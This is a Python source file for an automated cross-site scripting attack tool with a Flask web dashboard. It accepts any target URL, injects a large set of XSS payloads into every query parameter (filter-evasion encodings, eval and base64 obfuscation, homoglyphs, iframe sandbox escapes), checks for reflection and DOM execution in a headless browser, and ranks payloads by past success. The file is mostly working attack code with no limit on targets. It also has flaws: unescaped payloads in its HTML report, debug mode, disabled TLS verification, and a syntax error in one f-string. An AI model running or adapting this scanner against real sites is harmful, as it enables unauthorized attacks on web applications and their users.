# Full XSS AI Bot with Classifier, Sandbox Escapes, Fuzzing, Learning, and Web Dashboard

import httpx
import json
import os
import csv
import asyncio
import base64
import random
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from flask import Flask, request, render_template_string
from collections import defaultdict
from statistics import mean
from playwright.async_api import async_playwright

app = Flask(__name__)

DB_PATH = "payload_feedback.json"
REPORT_PATH = "xss_report.html"
JSON_PATH = "xss_report.json"
CSV_PATH = "xss_report.csv"
BURP_PROXY = "http://127.0.0.1:8080"

base_payloads = [
    {"payload": "<script>alert(1)</script>", "contexts": ["HTML_BODY"]},
    {"payload": "'><img src=x onerror=alert(1)>", "contexts": ["ATTR_VALUE"]},
    {"payload": "<svg/onload=alert(1)>", "contexts": ["HTML_BODY"]},
    {"payload": "</script><script>alert(1)</script>", "contexts": ["SCRIPT_BLOCK"]},
    {"payload": "'><iframe srcdoc='<script>alert(1)</script>'>", "contexts": ["HTML_BODY"]},
]

def fuzz_variants(payload):
    encoded = urllib.parse.quote(payload)
    html_escaped = payload.replace("<", "&#x3C;").replace(">", "&#x3E;")
    char_code = "".join([f"\x{ord(c):02x}" for c in payload])
    mixed_case = ''.join(random.choice([c.lower(), c.upper()]) for c in payload)
    return [
        {"payload": encoded, "type": "fuzz_urlencode"},
        {"payload": html_escaped, "type": "fuzz_html_entity"},
        {"payload": f"<script>eval('{char_code}')</script>", "type": "fuzz_charcode_eval"},
        {"payload": f"<script>{mixed_case}</script>", "type": "fuzz_mixed_case"},
    ]

def load_feedback():
    if os.path.exists(DB_PATH):
        with open(DB_PATH, 'r') as f:
            return json.load(f)
    return {}

def save_feedback(data):
    with open(DB_PATH, 'w') as f:
        json.dump(data, f, indent=2)

def get_type_scores(feedback):
    scores = defaultdict(list)
    for entry in feedback.values():
        scores[entry['type']].append(1.0 if entry['success'] else 0.0)
    return {k: mean(v) for k, v in scores.items() if v}

def mutate_payload(payload, context):
    if context == "HTML_BODY":
        return f"<svg/onload=alert(1)>{payload}" if "<svg" not in payload else payload
    elif context == "ATTR_VALUE":
        return f"' onerror=alert(1) {payload}" if "onerror" not in payload else payload
    elif context == "SCRIPT_BLOCK":
        return f"</script><script>{payload}</script>" if "<script>" not in payload else payload
    return payload

def detect_context(html, payload):
    soup = BeautifulSoup(html, 'html.parser')
    if payload in soup.get_text():
        return "HTML_BODY"
    if payload in str(soup):
        if f'"{payload}' in str(soup) or f"'{payload}" in str(soup):
            return "ATTR_VALUE"
        if '<script>' in str(soup) and payload in str(soup):
            return "SCRIPT_BLOCK"
    return "NOT_REFLECTED"

async def check_dom_xss(url, payload):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            executable_path="/root/.cache/ms-playwright/chromium-1169/chrome-linux/chrome"
        )
        page = await browser.new_page()
        try:
            await page.goto(url, timeout=10000)
            return await page.evaluate("document.body.innerHTML.includes(arguments[0])", payload)
        except:
            return False
        finally:
            await browser.close()

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))

def save_html_report(results):
    with open(REPORT_PATH, 'w') as f:
        f.write("<h1>XSS Scan Report</h1><table border='1'><tr><th>Param</th><th>Payload</th><th>Type</th><th>Context</th><th>DOM</th><th>Success</th></tr>")
        for r in results:
            f.write(f"<tr><td>{r['param']}</td><td>{r['payload']}</td><td>{r['type']}</td><td>{r['context']}</td><td>{r['dom_xss']}</td><td>{r['success']}</td></tr>")
        f.write("</table>")
    with open(JSON_PATH, 'w') as f:
        json.dump(results, f, indent=2)
    with open(CSV_PATH, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["param", "payload", "type", "context", "dom_xss", "success"])
        writer.writeheader()
        for r in results:
            writer.writerow(r)

def generate_mutations(entry):
    base = entry["payload"]
    context = entry["contexts"][0]
    base64_payload = base64.b64encode(base.encode()).decode()
    variants = [
        {"payload": base, "type": "base"},
        {"payload": base.replace("<", "&lt;").replace(">", "&gt;"), "type": "html_entity"},
        {"payload": base.replace("alert", "аlеrt"), "type": "unicode_homoglyph"},
        {"payload": f"<script>eval('al' + 'ert(1)')</script>", "type": "string_split"},
        {"payload": f"<script>eval(atob('{base64_payload}'))</script>", "type": "base64_eval"},
        {"payload": f"<script>Function('alert(1)')()</script>", "type": "js_hackers_function"},
        {"payload": f"<script>setTimeout('alert(1)')</script>", "type": "js_hackers_settimeout"},
        {"payload": f"<script>window['al' + 'ert'](1)</script>", "type": "js_hackers_bracket_call"},
        {"payload": f"<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>", "type": "js_hackers_unicode_eval"},
        {"payload": f"<script>throw alert</script><img onerror='alert(1)'>", "type": "js_hackers_throw_onerror"},
        {"payload": f"<form name=alert></form><input name=alert><script>top.alert(1)</script>", "type": "js_hackers_clobber"},
        {"payload": f"<iframe sandbox srcdoc='<script>parent.alert(1)</script>'></iframe>", "type": "sandbox_escape_iframe_parent"},
        {"payload": f"<iframe srcdoc='<form action=javascript:alert(1)><input type=submit></form>'></iframe>", "type": "sandbox_escape_autosubmit"},
        {"payload": f"<iframe srcdoc='<script>top.eval(`alert(1)`)</script>'></iframe>", "type": "sandbox_escape_top_eval"},
    ] + fuzz_variants(base)
    return [{"payload": v["payload"], "contexts": [context], "score": 1.0, "type": v["type"]} for v in variants]

def scan_and_train(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return "No query parameters found."
    feedback = load_feedback()
    scores = get_type_scores(feedback)
    results = []
    for param in params:
        for base_entry in base_payloads:
            mutations = generate_mutations(base_entry)
            for entry in mutations:
                entry["score"] = scores.get(entry["type"], entry["score"])
                payload = mutate_payload(entry["payload"], entry["contexts"][0])
                test_url = inject_payload(url, param, payload)
                try:
                    r = httpx.get(test_url, timeout=10, proxies={"http://": BURP_PROXY, "https://": BURP_PROXY}, verify=False)
                    context = detect_context(r.text, payload)
                    dom_xss = asyncio.run(check_dom_xss(test_url, payload))
                    success = context != "NOT_REFLECTED" or dom_xss
                except Exception:
                    context = "ERROR"; dom_xss = False; success = False
                feedback[f"{param}:{payload}"] = {"param": param, "payload": payload, "type": entry["type"], "context": context, "dom_xss": dom_xss, "success": success}
                results.append(feedback[f"{param}:{payload}"])
    save_feedback(feedback)
    save_html_report(results)
    return f"Scan complete. {len(results)} payloads tested."

@app.route('/', methods=['GET', 'POST'])
def dashboard():
    message = ""
    if request.method == 'POST':
        url = request.form.get('url')
        if url:
            message = scan_and_train(url)
    return render_template_string('''<h1>XSS Bot Dashboard</h1>
        <form method="post">
            Target URL: <input name="url" size="80">
            <input type="submit" value="Scan">
        </form>
        <p>{{ message }}</p>
        <a href="/report">View Report</a>
    ''', message=message)

@app.route('/report')
def report():
    if os.path.exists(REPORT_PATH):
        return open(REPORT_PATH).read()
    return "No report yet."

if __name__ == '__main__':
    app.run(debug=True)